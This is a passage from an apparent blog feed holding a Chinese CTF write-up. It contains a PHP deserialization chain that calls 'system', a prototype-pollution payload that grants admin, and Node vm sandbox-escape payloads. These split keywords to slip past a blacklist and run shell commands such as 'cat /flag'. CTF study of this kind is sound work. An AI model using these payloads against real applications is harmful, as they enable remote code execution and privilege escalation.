class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cache</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$expired</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$helper</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Storage</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$store</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$funcs</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataObject</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$storage</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>&#125;<br>    <br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataObject</span>();<br>    <span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Storage</span>();<br>    <span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cache</span>();<br>    <span class="hljs-variable">$c</span> -&gt; expired = False;<br>    <span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cache</span>();<br>    <span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>();<br>    <span class="hljs-variable">$a</span>-&gt; data = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;key1&#x27;</span> =&gt; <span class="hljs-variable">$c</span>, <span class="hljs-string">&#x27;key2&#x27;</span> =&gt; <span class="hljs-variable">$d</span>);<span class="hljs-comment">//æ”¾å…¥Cache1å’ŒCache2ï¼Œä¸¤ä¸ªå®ä¾‹</span><br>    <span class="hljs-variable">$a</span>-&gt; storage = <span class="hljs-variable">$b</span>; <span class="hljs-comment">//è¿™é‡Œè§¦å‘äº†Storageä¸­çš„__setæ–¹æ³•</span><br>    <span class="hljs-variable">$b</span>-&gt; store = &amp;<span class="hljs-variable">$d</span>-&gt;expired;<span class="hljs-comment">//é€šè¿‡å¼•ç”¨èµ‹å€¼ç»•è¿‡__wakeupï¼Œstoreå’Œ$dæŒ‡å‘ç›¸åŒçš„å†…å­˜åœ°å€</span><br>    <span class="hljs-variable">$d</span> -&gt; key = <span class="hljs-string">&#x27;id&#x27;</span>;<br>    <span class="hljs-variable">$d</span>-&gt; helper = <span class="hljs-variable">$e</span>;<br>    <span class="hljs-variable">$e</span>-&gt; <span class="hljs-variable">$funcs</span> = [<span class="hljs-string">&#x27;clean&#x27;</span> =&gt; <span class="hljs-string">&#x27;system&#x27;</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><br><br>DataObject.__destruct<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> Storage.__set<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> Cache.expired<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> Helper.__call()<br><br><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">å‚è€ƒæ–‡ç« :ttps:<span class="hljs-regexp">//</span>zhuanlan.zhihu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">377676274</span><br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">pear:</span><br><span class="hljs-symbol">https:</span>//longlone.top/<span class="hljs-variable">%E5</span><span class="hljs-variable">%AE</span><span class="hljs-variable">%89</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%85</span><span class="hljs-variable">%A8</span>/<span class="hljs-variable">%E5</span><span class="hljs-variable">%AE</span><span class="hljs-variable">%89</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%85</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%94</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%B6</span>/register_argc_argv<span class="hljs-variable">%E4</span><span class="hljs-variable">%B8</span><span class="hljs-variable">%8</span>Einclude<span class="hljs-variable">%20</span><span class="hljs-keyword">to</span><span class="hljs-variable">%20</span>RCE<span class="hljs-variable">%E7</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%84</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%B7</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%A6</span><span class="hljs-variable">%99</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%BB</span><span class="hljs-variable">%84</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%90</span><span class="hljs-variable">%88</span>/<br><span class="hljs-symbol">https:</span>//blog.csdn.net/RABCDXB/article/details/<span class="hljs-number">122050370</span><br><br></code></pre></td></tr></table></figure><h3 id="Week-2-ez-sandbox"><a href="#Week-2-ez-sandbox" class="headerlink" title="[Week 2] ez_sandbox"></a>[Week 2] ez_sandbox</h3><p><code>app.js</code>ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>)<br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-session&#x27;</span>)<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>()<br><br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>())<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>(&#123;<br>    <span class="hljs-attr">secret</span>: crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">64</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>),<br>    <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">true</span><br>&#125;))<br><br><span class="hljs-keyword">var</span> users = &#123;&#125;<br><span class="hljs-keyword">var</span> admins = &#123;&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123; <span class="hljs-comment">//mergeï¼ŒåŸå‹é“¾æ±¡æŸ“</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key === <span class="hljs-string">&#x27;__proto__&#x27;</span>) &#123;<span class="hljs-comment">//è¿™é‡Œè¿‡æ»¤äº†__protp__</span><br>            <span class="hljs-keyword">continue</span><span class="hljs-comment">//ä¸­æ–­è¿­ä»£ï¼Œè¿›å…¥ä¸‹ä¸€æ¬¡å¾ªç¯</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> target<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">clone</span>(<span class="hljs-params">source</span>) &#123; <span class="hljs-comment">//åŒä¸Š</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">merge</span>(&#123;&#125;, source)<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">code</span>) &#123;<br>    <span class="hljs-keyword">let</span> blacklist = [<span class="hljs-string">&#x27;constructor&#x27;</span>, <span class="hljs-string">&#x27;mainModule&#x27;</span>, <span class="hljs-string">&#x27;require&#x27;</span>, <span class="hljs-string">&#x27;child_process&#x27;</span>, <span class="hljs-string">&#x27;process&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;execSync&#x27;</span>, <span class="hljs-string">&#x27;execFile&#x27;</span>, <span class="hljs-string">&#x27;execFileSync&#x27;</span>, <span class="hljs-string">&#x27;spawn&#x27;</span>, <span class="hljs-string">&#x27;spawnSync&#x27;</span>, <span class="hljs-string">&#x27;fork&#x27;</span>]<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v <span class="hljs-keyword">of</span> blacklist) &#123;<br>        <span class="hljs-keyword">if</span> (code.<span class="hljs-title function_">includes</span>(v)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(v + <span class="hljs-string">&#x27; is banned&#x27;</span>)<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">requireLogin</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>) &#123;<br>        res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/login&#x27;</span>)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_">next</span>()<br>    &#125;<br>&#125;<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>) &#123;<br>        <span class="hljs-keyword">delete</span> <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>[key]<br>    &#125;<br>    <span class="hljs-title function_">next</span>()<br>&#125;)<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, requireLogin, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-title function_">sendFile</span>(__dirname + <span class="hljs-string">&#x27;/public/index.html&#x27;</span>)<br>&#125;)<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-title function_">sendFile</span>(__dirname + <span class="hljs-string">&#x27;/public/login.html&#x27;</span>)<br>&#125;)<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/register&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-title function_">sendFile</span>(__dirname + <span class="hljs-string">&#x27;/public/register.html&#x27;</span>)<br>&#125;)<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">let</span> &#123; username, password &#125; = <span class="hljs-title function_">clone</span>(req.<span class="hljs-property">body</span>)<br><br>    <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> users &amp;&amp; password === users[username]) &#123;<br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span> = username<br><br>        <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> admins) &#123;<br>            req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> = <span class="hljs-string">&#x27;admin&#x27;</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> = <span class="hljs-string">&#x27;guest&#x27;</span><br>        &#125;<br><br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;login success&#x27;</span><br>        &#125;)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;login failed&#x27;</span><br>        &#125;)<br>    &#125;<br>&#125;)<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/register&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">let</span> &#123; username, password &#125; = <span class="hljs-title function_">clone</span>(req.<span class="hljs-property">body</span>)<br><br>    <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> users) &#123;<br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;register failed&#x27;</span><br>        &#125;)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        users[username] = password<br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;register success&#x27;</span><br>        &#125;)<br>    &#125;<br>&#125;)<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/profile&#x27;</span>, requireLogin, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-title function_">send</span>(&#123;<br>        <span class="hljs-string">&#x27;user&#x27;</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>,<br>        <span class="hljs-string">&#x27;role&#x27;</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span><br>    &#125;)<br>&#125;)<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/sandbox&#x27;</span>, requireLogin, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>        <span class="hljs-keyword">let</span> code = req.<span class="hljs-property">body</span>.<span class="hljs-property">code</span><br>        <span class="hljs-keyword">let</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>)<br>        <span class="hljs-keyword">let</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox)<br>        <br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-title function_">waf</span>(code)<br>            <span class="hljs-keyword">let</span> result = vm.<span class="hljs-title function_">runInContext</span>(code, context)<br>            res.<span class="hljs-title function_">send</span>(&#123;<br>                <span class="hljs-string">&#x27;result&#x27;</span>: result<br>            &#125;)<br>        &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>            res.<span class="hljs-title function_">send</span>(&#123;<br>                <span class="hljs-string">&#x27;result&#x27;</span>: e.<span class="hljs-property">message</span><br>            &#125;)<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-string">&#x27;result&#x27;</span>: <span class="hljs-string">&#x27;Your role is not admin, so you can not run any code&#x27;</span><br>        &#125;)<br>    &#125;<br>&#125;)<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/logout&#x27;</span>, requireLogin, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-title function_">destroy</span>()<br>    res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/login&#x27;</span>)<br>&#125;)<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;server start listening on :3000&#x27;</span>)<br>&#125;)<br></code></pre></td></tr></table></figure><p>å…ˆçœ‹å’ŒåŸå‹é“¾æ±¡æŸ“æœ‰å…³çš„éƒ¨åˆ†ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">let</span> &#123; username, password &#125; = <span class="hljs-title function_">clone</span>(req.<span class="hljs-property">body</span>) <span class="hljs-comment">//è§£æ„èµ‹å€¼ï¼Œä»req.bodyå¯¹è±¡ä¸­æå–usernameå’Œpasswordå±æ€§å€¼ï¼Œå¹¶å°†å®ƒä»¬åˆ†åˆ«èµ‹å€¼ç»™å˜é‡usernameå’Œpasswordã€‚</span><br><br>    <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> users &amp;&amp; password === users[username]) &#123;<br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span> = username<br><br>        <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> admins) &#123; <span class="hljs-comment">//ç›®çš„æ˜¯æ‹¿åˆ°adminè§’è‰²</span><br>            req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> = <span class="hljs-string">&#x27;admin&#x27;</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> = <span class="hljs-string">&#x27;guest&#x27;</span><br>        &#125;<br><span class="hljs-comment">//clone(req.body)çœ‹æˆmerge(&#123;&#125;, req.body)ã€‚åˆ©ç”¨req.bodyæ±¡æŸ“adminså³å¯</span><br></code></pre></td></tr></table></figure><p>åœ¨<code>POST</code>åŒ…ä¸­å¢åŠ å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123&quot;</span>,<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>&#125;&#125;&#125;<br><span class="hljs-comment">//__proto__è¢«è¿‡æ»¤ï¼Œé€šè¿‡&quot;constructor&quot;: &#123;&quot;prototype&quot;: ç»•è¿‡å³å¯</span><br>&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123&quot;</span>,<span class="hljs-string">&quot;constructor&quot;</span>: &#123;<span class="hljs-string">&quot;prototype&quot;</span>: &#123;<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>&#125;&#125;&#125;<br><span class="hljs-comment">//å­˜åœ¨admins.__proto__.test=123ï¼Œusername=&#x27;test&#x27;ï¼Œä½¿å¾—username in adminsæˆç«‹</span><br></code></pre></td></tr></table></figure><p>ç»“æœï¼š</p><p><img src="/img/sb2.png" alt="sb2"></p><p><code>payload:</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, &#123; <br><span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123; <br><span class="hljs-keyword">const</span> c = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span><br><span class="hljs-keyword">const</span> p = (c[<span class="hljs-string">&#x27;constru&#x27;</span>+<span class="hljs-string">&#x27;ctor&#x27;</span>][<span class="hljs-string">&#x27;constru&#x27;</span>+<span class="hljs-string">&#x27;ctor&#x27;</span>](<span class="hljs-string">&#x27;return pro&#x27;</span>+<span class="hljs-string">&#x27;cess&#x27;</span>))()<br><span class="hljs-keyword">return</span> p[<span class="hljs-string">&#x27;mainM&#x27;</span>+<span class="hljs-string">&#x27;odule&#x27;</span>][<span class="hljs-string">&#x27;requi&#x27;</span>+<span class="hljs-string">&#x27;re&#x27;</span>](<span class="hljs-string">&#x27;child_pr&#x27;</span>+<span class="hljs-string">&#x27;ocess&#x27;</span>)[<span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ecSync&#x27;</span>](<span class="hljs-string">&#x27;ls /&#x27;</span>).<span class="hljs-title function_">toString</span>();<br> &#125;<br>&#125;)<br>æˆ–<br><span class="hljs-keyword">let</span> obj = &#123;&#125; <br>obj.<span class="hljs-title function_">__defineGetter__</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">const</span> c = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span><br><span class="hljs-keyword">const</span> p = (c[<span class="hljs-string">&#x27;constru&#x27;</span>+<span class="hljs-string">&#x27;ctor&#x27;</span>][<span class="hljs-string">&#x27;constru&#x27;</span>+<span class="hljs-string">&#x27;ctor&#x27;</span>](<span class="hljs-string">&#x27;return pro&#x27;</span>+<span class="hljs-string">&#x27;cess&#x27;</span>))()<br><span class="hljs-keyword">return</span> p[<span class="hljs-string">&#x27;mainM&#x27;</span>+<span class="hljs-string">&#x27;odule&#x27;</span>][<span class="hljs-string">&#x27;requi&#x27;</span>+<span class="hljs-string">&#x27;re&#x27;</span>](<span class="hljs-string">&#x27;child_pr&#x27;</span>+<span class="hljs-string">&#x27;ocess&#x27;</span>)[<span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ecSync&#x27;</span>](<span class="hljs-string">&#x27;cat /flag&#x27;</span>).<span class="hljs-title function_">toString</span>();<br>&#125;)<br><span class="hljs-keyword">throw</span> obj<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LeetCodeåšé¢˜è®°å½•_1</title>
    <link href="/2023/09/19/2023-9-19-LeetCode%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_1/"/>
    <url>/2023/09/19/2023-9-19-LeetCode%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_1/</url>
    
